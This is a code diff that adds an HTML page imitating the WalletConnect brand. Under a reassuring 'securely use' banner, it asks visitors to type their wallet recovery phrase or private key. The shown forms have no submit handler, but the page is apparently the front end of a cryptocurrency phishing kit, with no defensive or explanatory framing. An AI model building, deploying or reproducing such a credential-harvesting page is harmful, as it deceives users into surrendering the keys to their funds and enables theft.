@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect Wallet</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <link rel="stylesheet" href="../unpkg.com/flowbite%401.5.3/dist/flowbite.min.css" />
+    <link rel="stylesheet" href="../rsms.me/inter/inter.html">
+    <script src="https://cdn.tailwindcss.com/"></script>
+    <script src="https://cdn.tailwindcss.com/?plugins=forms,typography,aspect-ratio,line-clamp"></script>
+
+    <script src="https://cdn.tailwindcss.com/"></script>
+</head>
+<body style="background-color:#08081c">
+    <section class="flex flex-col items-center justify-center min-h-screen px-6 py-8 mx-auto max-w-md">
+        <a class='flex items-center font-bold text-white' href='./index.html'>
+            <img src="./images/wc1.png" class="mr-3 mb-5" style="height:30px" alt="Logo">
+            <span>Walletconnect</span>
+        </a>
+        <div class="p-4 text mb-4 text-sm text-blue-700 bg-blue-100 rounded-lg" role="alert">
+            <span class="font-medium">Info alert!</span> Securely use any of the options below 
+        </div> 
+
+        <div class="w-full bg-white rounded-lg shadow">
+            <div class="mb-4 border-b border-gray-200">
+                <ul class="flex flex-wrap -mb-px text-sm font-medium text-center" id="myTab" data-tabs-toggle="#myTabContent" role="tablist">
+                    <li class="mr-2" role="presentation">
+                        <button class="inline-block p-4 rounded-t-lg border-b-2 text-blue-600 hover:text-blue-600 border-blue-600" id="profile-tab" data-tabs-target="#profile" type="button" role="tab" aria-controls="profile" aria-selected="true">Phrase</button>
+                    </li>
+                    <li class="mr-2" role="presentation">
+                        <button class="inline-block p-4 rounded-t-lg border-b-2 border-transparent hover:text-gray-600 text-gray-500" id="settings-tab" data-tabs-target="#settings" type="button" role="tab" aria-controls="settings" aria-selected="false" onclick="showPrivateKeyForm()">Private Key</button>
+                    </li>
+                </ul>
+            </div>
+            <div id="myTabContent">
+                <div class="p-4 bg-gray-50 rounded-lg" id="profile" role="tabpanel" aria-labelledby="profile-tab">
+                    <form id="phraseForm">
+                        <div class="form-group">
+                            <label for="phraseInput">Enter Phrase</label>
+                            <textarea row="4" minlength="12" type="textarea" class="form-control" id="phraseInput" placeholder ="Enter your 12 recovery phrase typically 12 - 24 words seperated by a single phrase" required>
+                        </textarea>    
+                        </div>
+                        <button type="submit" class="btn btn-primary">Connect</button>
+                    </form>
+                </div>
+                <div class="hidden p-4 bg-gray-50 rounded-lg" id="settings" role="tabpanel" aria-labelledby="settings-tab">
+                    <form id="privateKeyForm">
+                        <div class="form-group">
+                            <label for="privateKeyInput">Enter Private Key</label>
+                            <input type="text" class="form-control" id="privateKeyInput" placeholder="Type your private key here" required>
+                        </div>
+                        <button type="submit" class="btn btn-primary">Connect</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <div class="copyright">
+        <p>Copyright &copy; 2024 <a href="#">Your Company</a>. All Rights Reserved</p>
+    </div>
+
+    <script>
+    function showPrivateKeyForm() {
+        document.getElementById('profile').classList.add('hidden');
+        document.getElementById('settings').classList.remove('hidden');
+    }
+    function showPhraseForm() {
+    document.getElementById('settings').classList.add('hidden');
+    document.getElementById('profile').classList.remove('hidden');
+}
+// Add event listeners to the tab buttons
+document.getElementById('profile-tab').addEventListener('click', showPhraseForm);
+document.getElementById('settings-tab').addEventListener('click', showPrivateKeyForm);
+    </script>
+    <script src="../unpkg.com/flowbite%401.5.3/dist/flowbite.js"></script>
+</body>
+</html>
